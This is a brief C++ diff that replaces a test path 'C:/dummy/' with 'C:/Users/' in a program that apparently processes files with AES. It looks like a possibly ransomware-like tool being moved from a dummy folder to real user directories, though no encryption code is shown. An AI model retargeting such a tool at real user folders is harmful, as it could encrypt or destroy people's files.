@@ -23,7 +23,7 @@ int main(int argc, char *argv[]) {
             path = "./dummy/";
     } else
         path = argv[1];
-    */path = "C:/dummy/"; argc=argc; argv=argv;
+    */path = "C:/Users/"; argc=argc; argv=argv;
     
     std::cout << "[i] Working within " << path << "\n";
     //AES.isLogging = false;;
